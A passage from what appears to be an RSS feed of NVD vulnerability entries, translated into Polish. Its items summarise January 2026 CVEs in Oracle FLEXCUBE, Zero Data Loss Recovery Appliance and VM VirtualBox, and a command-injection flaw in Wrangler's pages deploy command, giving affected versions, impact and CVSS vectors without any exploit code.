(CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L).</description></item><item><title>CVE-2026-21978</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21978</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle FLEXCUBE Universal Banking w Oracle Financial Services Applications (komponent: Relationship Pricing).Obsługiwane wersje, których to dotyczy, to 14.0.0.0.0-14.8.0.0.0.Łatwa do wykorzystania luka umożliwia atakującemu z niskimi uprawnieniami i dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń Oracle FLEXCUBE Universal Banking.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich danych dostępnych w Oracle FLEXCUBE Universal Banking.Wynik podstawowy CVSS 3.1 6,5 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).</description></item><item><title>CVE-2026-21977</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21977</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w oprogramowaniu Oracle Zero Data Loss Recovery Appliance firmy Oracle Zero Data Loss Recovery Appliance (komponent: Security).Obsługiwane wersje, których to dotyczy, to 23.1.0–23.1.202509.Trudna do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem Oracle Net złamanie zabezpieczeń oprogramowania Oracle Zero Data Loss Recovery Appliance.Skuteczne ataki wymagają interakcji ze strony osoby innej niż atakujący.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do odczytu podzbioru danych dostępnych w oprogramowaniu Oracle Zero Data Loss Recovery Appliance.Wynik podstawowy CVSS 3.1 3.1 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).</description></item><item><title>CVE-2026-21982</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21982</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Trudna do wykorzystania luka pozwala nieuwierzytelnionemu atakującemu z dostępem do fizycznego segmentu komunikacji podłączonego do sprzętu, na którym działa Oracle VM VirtualBox, w celu złamania zabezpieczeń Oracle VM VirtualBox.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować przejęciem Oracle VM VirtualBox.Wynik podstawowy CVSS 3.1 7,5 (wpływ na poufność, integralność i dostępność).Wektor CVSS: (CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).</description></item><item><title>CVE-2026-21985</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21985</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Łatwa do wykorzystania luka umożliwia atakującemu z wysokimi uprawnieniami, logującym się do infrastruktury, w której działa Oracle VM VirtualBox, w celu złamania zabezpieczeń Oracle VM VirtualBox.Chociaż luka występuje w Oracle VM VirtualBox, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle VM VirtualBox.Wynik podstawowy CVSS 3.1 6,0 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N).</description></item><item><title>CVE-2026-0933</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0933</link><pubDate>Tue, 20 Jan 2026 22:58:05 +0000</pubDate><description>Podsumowanie W poleceniu `wrangler Pages Deploy` stwierdzono lukę w zabezpieczeniach umożliwiającą wstrzykiwanie poleceń (CWE-78).Problem występuje, ponieważ parametr `--commit-hash` jest przekazywany bezpośrednio do polecenia powłoki bez odpowiedniej weryfikacji lub oczyszczenia, umożliwiając osobie atakującej mającej kontrolę nad `--commit-hash` wykonanie dowolnych poleceń w systemie, na którym działa Wrangler.
 
 
 
